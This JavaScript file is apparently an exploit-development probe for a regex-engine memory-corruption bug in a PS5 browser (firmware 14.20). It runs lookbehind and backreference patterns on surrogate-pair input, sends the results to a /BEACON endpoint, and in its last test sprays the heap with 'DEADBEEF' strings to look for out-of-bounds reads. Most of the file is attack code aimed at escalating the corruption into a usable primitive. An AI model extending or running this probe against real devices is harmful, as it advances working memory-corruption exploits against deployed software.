// p235 — C3 escalation via surrogate-pair capture pattern
// p233-A showed: /(?<=(\u{10000})\1*(a))b/u MATCHED on PS5 14.20
// Group 1 captures the surrogate pair itself. \1* backrefs a 2-code-unit sequence.
// If corruption happens but match still succeeds, captures may contain corrupted values.
// This probe deeply inspects that pattern and variants.

(function() {
  var B = "V235-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }

  function hexCP(s) {
    if (s === undefined) return "undef";
    if (s === null) return "null";
    if (typeof s === "number") return "n" + s;
    var r = [];
    for (var i = 0; i < s.length && i < 30; i++)
      r.push(s.charCodeAt(i).toString(16).padStart(4, "0"));
    return r.join("-") || "empty";
  }

  beacon("START");

  // === A: Reproduce p233-A exactly and extract full capture detail ===
  try {
    var input = "\u{10000}ab";
    var caps = [];
    input.replace(/(?<=(\u{10000})\1*(a))b/u, function() {
      for (var i = 0; i < arguments.length; i++) {
        var v = arguments[i];
        if (typeof v === "string") caps.push(i + ":" + hexCP(v));
        else caps.push(i + ":" + v);
      }
      return "X";
    });
    if (caps.length > 0) {
      beacon("A-FIRE-" + caps.length);
      for (var i = 0; i < caps.length; i++) beacon("A-ARG" + caps[i]);
    } else {
      beacon("A-NOFIRE");
    }
  } catch(e) { beacon("A-ERR-" + e.message.slice(0,40)); }

  // === B: exec() version — get match object directly ===
  try {
    var m = /(?<=(\u{10000})\1*(a))b/u.exec("\u{10000}ab");
    if (m) {
      beacon("B-IDX-" + m.index);
      beacon("B-M0-" + hexCP(m[0]));
      beacon("B-C1-" + hexCP(m[1]));
      beacon("B-C2-" + hexCP(m[2]));
      // Check if cap1 length matches expected (should be 2 code units for surrogate pair)
      if (m[1]) beacon("B-C1LEN-" + m[1].length);
      if (m[2]) beacon("B-C2LEN-" + m[2].length);
    } else {
      beacon("B-NULL");
    }
  } catch(e) { beacon("B-ERR-" + e.message.slice(0,40)); }

  // === C: Add more captures AFTER the corruption point ===
  // If \1* corrupts pos, does (.) after it capture at wrong position?
  try {
    var m = /(?<=(\u{10000})\1*(a)(.))./u.exec("\u{10000}abc");
    if (m) {
      beacon("C-IDX-" + m.index);
      beacon("C-C1-" + hexCP(m[1]));
      beacon("C-C2-" + hexCP(m[2]));
      beacon("C-C3-" + hexCP(m[3]));
      // C3 should be 'b' if clean, something else if corrupted
    } else {
      beacon("C-NULL");
    }
  } catch(e) { beacon("C-ERR-" + e.message.slice(0,40)); }

  // === D: Multiple surrogate pairs — does \1* actually iterate? ===
  try {
    var input = "\u{10000}\u{10000}\u{10000}ab";
    var m = /(?<=(\u{10000})\1*(a))b/u.exec(input);
    if (m) {
      beacon("D-IDX-" + m.index);
      beacon("D-C1-" + hexCP(m[1]) + "-len" + (m[1]||"").length);
      beacon("D-C2-" + hexCP(m[2]) + "-len" + (m[2]||"").length);
    } else {
      beacon("D-NULL");
    }
  } catch(e) { beacon("D-ERR-" + e.message.slice(0,40)); }

  // === E: Backreference the surrogate capture OUTSIDE the lookbehind ===
  // If corruption taints cap1's boundaries, \1 outside reads from corrupted matchBegin
  try {
    var input = "\u{10000}ab\u{10000}";
    var m = /(?<=(\u{10000})\1*(a))b\1/u.exec(input);
    if (m) {
      beacon("E-IDX-" + m.index);
      beacon("E-M0-" + hexCP(m[0]));
      beacon("E-C1-" + hexCP(m[1]));
    } else {
      beacon("E-NULL");
    }
  } catch(e) { beacon("E-ERR-" + e.message.slice(0,40)); }

  // === F: Use split to extract captures ===
  try {
    var input = "\u{10000}ab";
    var parts = input.split(/(?<=(\u{10000})\1*(a))b/u);
    beacon("F-PARTS-" + parts.length);
    for (var i = 0; i < parts.length && i < 8; i++) {
      beacon("F-P" + i + "-" + hexCP(parts[i]));
    }
  } catch(e) { beacon("F-ERR-" + e.message.slice(0,40)); }

  // === G: Capture a THIRD group at the corruption boundary ===
  // Pattern: (?<=(\u{10000})\1*(.)(a))b
  // Group 2 captures the char where \1* left off — if corrupted, it's wrong
  try {
    var m = /(?<=(\u{10000})\1*(.)(a))b/u.exec("\u{10000}ab");
    if (m) {
      beacon("G-C1-" + hexCP(m[1]));
      beacon("G-C2-" + hexCP(m[2]) + "-len" + (m[2]||"").length);
      beacon("G-C3-" + hexCP(m[3]));
      // Expected clean: C1=\u{10000}, C2=nothing(?), C3='a'
      // If corrupted: C2 might capture a surrogate code unit
    } else {
      beacon("G-NULL");
    }
  } catch(e) { beacon("G-ERR-" + e.message.slice(0,40)); }

  // === H: Padding input — surrogate + many 'a's + 'b' ===
  // More iterations of \1* on the surrogate pair
  try {
    var input = "\u{10000}" + "a".repeat(20) + "b";
    var m = /(?<=(\u{10000})\1*(a))b/u.exec(input);
    if (m) {
      beacon("H-IDX-" + m.index);
      beacon("H-C1-" + hexCP(m[1]) + "-len" + (m[1]||"").length);
      beacon("H-C2-" + hexCP(m[2]) + "-len" + (m[2]||"").length);
    } else {
      beacon("H-NULL");
    }
  } catch(e) { beacon("H-ERR-" + e.message.slice(0,40)); }

  // === I: Replace callback with the multi-surrogate variant ===
  try {
    var input = "\u{10000}\u{10000}\u{10000}ab";
    var caps = [];
    input.replace(/(?<=(\u{10000})\1*(a))b/u, function() {
      for (var i = 0; i < arguments.length; i++) {
        var v = arguments[i];
        if (typeof v === "string") caps.push(i + ":" + hexCP(v));
        else caps.push(i + ":" + v);
      }
      return "X";
    });
    if (caps.length > 0) {
      for (var i = 0; i < caps.length; i++) beacon("I-" + caps[i]);
    } else {
      beacon("I-NOFIRE");
    }
  } catch(e) { beacon("I-ERR-" + e.message.slice(0,40)); }

  // === J: Compare index values for corruption detection ===
  // Run the pattern on different inputs and compare match indices
  try {
    // Clean pattern (no backref) for baseline
    var m1 = /(?<=\u{10000}(a))b/u.exec("\u{10000}ab");
    var idx1 = m1 ? m1.index : -1;
    // Corruption pattern (with backref)
    var m2 = /(?<=(\u{10000})\1*(a))b/u.exec("\u{10000}ab");
    var idx2 = m2 ? m2.index : -1;
    beacon("J-CLEAN-" + idx1 + "-CORRUPT-" + idx2);
    if (m1 && m2) {
      // Compare capture offsets via replace
      var off1, off2;
      "\u{10000}ab".replace(/(?<=\u{10000}(a))b/u, function(m, c1, off) { off1 = off; return m; });
      "\u{10000}ab".replace(/(?<=(\u{10000})\1*(a))b/u, function(m, c1, c2, off) { off2 = off; return m; });
      beacon("J-OFF1-" + off1 + "-OFF2-" + off2);
    }
  } catch(e) { beacon("J-ERR-" + e.message.slice(0,40)); }

  // === K: The critical test — capture AFTER backref, use it OUTSIDE ===
  // If \1* corrupts, group 3 captures at corrupted pos.
  // Then \3 outside the lookbehind calls reread(corrupted matchBegin).
  try {
    var input = "\u{10000}abb";
    var m = /(?<=(\u{10000})\1*(a)(.))\3/u.exec(input);
    if (m) {
      beacon("K-MATCH-" + hexCP(m[0]));
      beacon("K-C1-" + hexCP(m[1]));
      beacon("K-C2-" + hexCP(m[2]));
      beacon("K-C3-" + hexCP(m[3]));
    } else {
      beacon("K-NULL");
    }
  } catch(e) { beacon("K-ERR-" + e.message.slice(0,40)); }

  // === L: Heap spray + surrogate capture pattern ===
  // If the pattern DOES match, try with controlled heap adjacent data
  try {
    var spray = [];
    for (var i = 0; i < 500; i++) spray.push("DEADBEEF".repeat(128));
    var input = "\u{10000}" + "a".repeat(100) + "b" + "C".repeat(200);
    var m = /(?<=(\u{10000})\1*(a{1,100}))b/u.exec(input);
    if (m) {
      beacon("L-IDX-" + m.index);
      beacon("L-C2LEN-" + (m[2]||"").length);
      // Check if cap2 contains anything unexpected (not 'a')
      var c2 = m[2] || "";
      for (var i = 0; i < c2.length; i++) {
        var cc = c2.charCodeAt(i);
        if (cc !== 0x61) { // not 'a'
          beacon("L-ANOMALY-pos" + i + "-cp" + cc.toString(16));
          break;
        }
      }
      if (c2.length > 100) beacon("L-OVERREAD-" + c2.length);
    } else {
      beacon("L-NULL");
    }
    spray = null;
  } catch(e) { beacon("L-ERR-" + e.message.slice(0,40)); }

  beacon("DONE");
})();
